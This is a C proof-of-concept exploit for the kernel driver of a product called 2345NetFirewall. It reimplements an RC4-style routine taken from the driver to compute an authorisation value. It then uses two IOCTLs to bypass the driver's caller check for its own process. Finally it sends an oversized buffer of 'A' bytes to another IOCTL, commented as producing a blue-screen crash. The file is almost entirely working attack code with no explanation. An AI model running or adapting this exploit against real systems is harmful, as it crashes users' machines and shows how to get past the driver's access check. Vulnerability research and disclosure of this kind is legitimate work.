#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

struct NETFW_IOCTL_ADD_PID
{
	DWORD pid;
	char seed[0x14];//4 + 14
};//0x18

#pragma pack(push)
#pragma pack(1)
struct NETFW_IOCTL_SET_PID
{
	BYTE set_state;//
	WORD buf_len;//1
	DWORD pid;//3
	char buf[0x64];//7
};//6B
#pragma pack(pop)

int __stdcall f_XOR__12A30(BYTE *a1, BYTE *a2)
{
	BYTE *a1_; // eax

	a1_ = a1;
	*a1_ ^= *a2;
	*a2 ^= *a1;
	*a1_ ^= *a2;
	return (int)a1_;
}

int __stdcall sub_12A80(char *a1, int len, char *a3)
{
	int result;
	unsigned __int8 v4;
	__int16 i;
	__int16 j;
	unsigned __int8 k;

	for (i = 0; i < 256; ++i)
		a3[i] = i;
	a3[256] = 0;
	a3[257] = 0;
	k = 0;
	v4 = 0;
	result = 0;
	for (j = 0; j < 256; ++j)
	{
		v4 += a3[j] + a1[k];
		f_XOR__12A30((BYTE*)&a3[j], (BYTE*)&a3[v4]);
		result = (k + 1) / len;
		k = (k + 1) % len;
	}
	return result;
}

char *__stdcall sub_12B60(char *a1, signed int len, char *a3)
{
	char *v3; // esi
	unsigned int v4; // ebx
	unsigned __int8 result; // al
	int v6; // edi
	char *v7; // ST18_4
	int v8; // [esp+14h] [ebp-8h]
	int v9; // [esp+18h] [ebp-4h]
	unsigned __int8 v10; // [esp+2Fh] [ebp+13h]

	v3 = a3;
	v4 = a3[256];
	result = a3[257];
	v9 = 0;
	if (len > 0)
	{
		v6 = (unsigned __int8)v4;
		v8 = 0;
		while (1)
		{
			v4 = (v6 + 1) & 0x800000FF;
			v6 = (unsigned __int8)v4;
			v10 = v3[(unsigned __int8)v4] + result;
			v7 = &v3[v10];
			f_XOR__12A30((BYTE*)&v3[(unsigned __int8)v4], (BYTE*)v7);
			a1[v8] ^= v3[(unsigned __int8)(v3[(unsigned __int8)v4] + *v7)];
			v8 = (signed __int16)++v9;
			if ((signed __int16)v9 >= len)
				break;
			result = v10;
		}
		result = v10;
	}
	v3[256] = v4;
	v3[257] = result;
	return (char *)result;
}

void calc_seed(char* seed, char* dst)
{
	char Source1[26] = { 0 };
	char a3[300] = { 0 };

	Source1[0] = 8;
	Source1[1] = 14;
	Source1[2] = 8;
	Source1[3] = 10;
	Source1[4] = 2;
	Source1[5] = 3;
	Source1[6] = 29;
	Source1[7] = 23;
	Source1[8] = 13;
	Source1[9] = 3;
	Source1[10] = 15;
	Source1[11] = 22;
	Source1[12] = 15;
	Source1[13] = 7;
	Source1[14] = 91;
	Source1[15] = 4;
	Source1[16] = 18;
	Source1[17] = 26;
	Source1[18] = 26;
	Source1[19] = 3;
	Source1[20] = 4;
	Source1[21] = 1;
	Source1[22] = 15;
	Source1[23] = 25;
	Source1[24] = 10;
	Source1[25] = 13;

	sub_12A80(seed, 0x14, a3);        
	sub_12B60(Source1, 0x1A, a3);
	memcpy(dst, Source1, 26);
}

BOOL BypassChk(HANDLE h)
{
	DWORD BytesReturned = 0;

	DWORD ctlcode = 0x222090;
	NETFW_IOCTL_ADD_PID add_pid = { 0 };
	add_pid.pid = GetCurrentProcessId();

	if (!DeviceIoControl(h, ctlcode, &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &add_pid, sizeof(NETFW_IOCTL_ADD_PID), &BytesReturned, NULL)) {
		printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
		return FALSE;
	}

	ctlcode = 0x222094;
	NETFW_IOCTL_SET_PID set_pid = { 0 };
	set_pid.pid = GetCurrentProcessId();
	set_pid.set_state = 1;

	calc_seed(add_pid.seed, set_pid.buf);
	set_pid.buf_len = 26;

	if (!DeviceIoControl(h, ctlcode, &set_pid, sizeof(NETFW_IOCTL_SET_PID), &set_pid, sizeof(NETFW_IOCTL_SET_PID), &BytesReturned, NULL)) {
		printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
		return FALSE;
	}

	return TRUE;
}

HANDLE OpenDevice(char* path)
{
	return CreateFileA(path,
		GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
}

int poc_2345NetFirewall()
{
	
	DWORD BytesReturned = 0;

	HANDLE h = OpenDevice("\\\\.\\2345BdPcSafe");
	if (h == INVALID_HANDLE_VALUE) {
		printf("[-] Open device error: %d\n", GetLastError());
		return 1;
	}

	if (!BypassChk(h)) {
		printf("[-] error!");
		return 1;
	}
	
	//BSOD
	DWORD ctlcode = 0x222548;
	char buff[0x300] = { 0 };
	memset(buff, 0x41, 0x300);

	if(!DeviceIoControl(h, ctlcode, buff, 0x300, buff, 0, &BytesReturned, NULL)) {
		printf("[-] DeviceIoControl %x error: %d\n", ctlcode, GetLastError());
	}
	return 0;
}

int main()
{
	poc_2345NetFirewall();

	getchar();
		
	return 0;
}